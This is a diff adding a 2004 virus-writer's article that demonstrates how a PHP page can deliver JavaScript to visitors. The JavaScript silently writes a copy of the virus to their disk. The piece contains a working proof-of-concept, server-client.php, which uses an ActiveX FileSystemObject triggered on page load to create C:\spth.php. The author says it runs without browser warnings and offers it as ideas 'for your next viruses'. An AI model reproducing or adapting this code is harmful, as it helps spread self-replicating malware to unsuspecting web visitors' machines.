@@ -1,0 +1,142 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************  Server -> Client Communtication for ***********
+          ************     Preprocessor languages (PHP)     ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+  Index:
+  ******
+
+  0) Intro Words
+
+  1) The idea (Theory)
+
+  2) The code
+
+  3) Last Words
+
+
+
+
+
+  0) Intro Words
+
+     A 'Preprocessor language' is a web-based language, which has been done to run
+     on a server, and only on the server. The results by the executed web-based 
+     preprocessor script (like PHP) file will be transfered to the Webpage, which 
+     can be seen by the user. That means, the user will never see the code of that
+     script. As a result, the script can not harm the user in any way, because it is
+     executed on the server, (and only there) and just the results are send to the
+     user. This has been also written in VirusBulletin March/2001 in an article by
+     Denis Zenlin & Mike Pavlushchik called 'PHP go the Script Viruses'. The article
+     deals with the PHP.Pirus (29a#5) and PHP.NewWorld and the common PHP problem.
+     A very important statement of the article: '... and it does not have the ability
+     to spread to other Web sites or PCs of the visitors who view an HTML page containing
+     a malicious PHP script. This last case is not possible simply because a user
+     receives a pure HTML page with absolutely no script inside from the PHP processor...'
+     Well, that's not true at all, which I will prove in this article. :)
+
+
+
+
+
+  1) The idea (Theory)
+
+     It is very true that the PHP code is executed on the server, and just on the server.
+     And it returns just the pure HTML code. That made me think about that topic more
+     intensive. Finally I got an idea: If the PHP script returns a HTML code, and HTML
+     codes could contain '<script>' tags with viruses, it should be possible to make a
+     PHP virus processed on the server, but affecting the client. I tried it with a simple
+     JavaScript in the body, but it didn't work, because the JavaScript code will not
+     executed directly. Why not? I don't really know, I think because the execution of the
+     HTML is already after the returned JavaScript code. That made me feel strange: I know
+     the code is there in the HTML (you can see the HTML code in your IE ;), but it isn't
+     executed (=don't work). After alot of thinking I got the final idea: I let the JavaScript
+     be a function in the <head>-tag and call it via <body language ... >. And this one worked.
+
+     OK, what we need:
+     --> A PHP code returning (via for example 'echo') a JavaScript code.
+     --> The PHP code is in the <head>-tag of the new generated HTML file, which means
+         that the returned JavaScript is also in the <head>-tag.
+     --> The JavaScript (which will be executed on the client) creates a file with the
+         full content of the PHP-virus.
+     --> Call the JavaScript function in the <head> via <body language ... >.
+
+     A really quite cool side-effect is this one:
+     Normally, if you have a Web-Page containing a JavaScript code, the user will get two warnings:
+
+     1. The WinXP SP2 warning, that a script should be executed.
+     2. The IE warning, that WScript should be used by the script.
+
+     After these two messages, the user will be that scared of the page, that (s)he will not accept
+     execution of the script.
+
+     Now the side effect: If you use this technique, and somebody runs it, there are NO (!!!) warnings,
+     error-messages or informations about the danger of script. It just will be executed, that's all. :)
+
+
+
+
+
+  2) The code
+
+     Well, now you should understand the idea, how it works (I hope so :D). Now let's move to the code!
+     I've tested the code on my WinXP SP2 + IE 6.0 with PHP 5.0.2 on my computer (where I'm server + client)
+     and on a www.host.sk domain, where I'm just a client. And, surprise/surprise, it worked anyway. ;)
+     The following code will create a file called 'spth.php' on the harddisk C with it's own code, if a
+     user (client) runs it. And most important: There will be NO warnings about the script. :)
+     Now have a look at the code:
+
+ - - - - - - - - - - - - - [ server-client.php ] - - - - - - - - - - - - -
+<?
+$nl=chr(13).chr(10);
+echo '<html><head>';
+echo '<script language='.chr(34).'JavaScript'.chr(34).'>'.$nl;
+echo 'function go(){'.$nl;
+echo 'var fso=new ActiveXObject('.chr(34).'Scripting.FileSystemObject'.chr(34).')'.$nl;
+echo 'var file=fso.CreateTextFile('.chr(34).'C:\\\spth.php'.chr(34).')'.$nl;
+$cont=fread(fopen (__FILE__, 'r'),filesize(__FILE__));
+$i=0;$nc='';
+echo 'file.Write(';
+while ($i<strlen($cont)){
+  echo 'String.fromCharCode('.ord($cont{$i}).')+';
+  $i++;
+}
+echo chr(34).chr(34).')'.$nl;
+echo 'file.Close()}'.$nl;
+echo '</script></head>';$nl.$nl;
+?>
+
+<body language="JavaScript" onload="go()"></body></html>
+ - - - - - - - - - - - - - [ server-client.php ] - - - - - - - - - - - - -
+
+
+
+
+
+  3) Last Words
+
+     This technique is a prove that PHP can affect the user (client), even many people denied it.
+     Beside of the problem that PHP is not that secure, the technique is very dangerous because
+     there are NO warnings, the script just works without any messange, and the user don't even
+     recognize it. It would be able to make a fully virus with this technique, which infects the
+     users HD, and (s)he would not recognize it. Therefore such a creature could be easiely get in
+     the wild.
+     That result makes me happy, because two new things has been discovered. I hope I gave you with
+     that article some help or maybe new ideas for your next viruses...
+
+
+
+                                                        - - - - - - - - - - - - - - -
+                                                          Second Part To Hell/[rRlf]  
+                                                          www.spth.de.vu
+                                                          spth@priest.com
+                                                          written from november 2004
+                                                          Austria
+                                                        - - - - - - - - - - - - - - - 
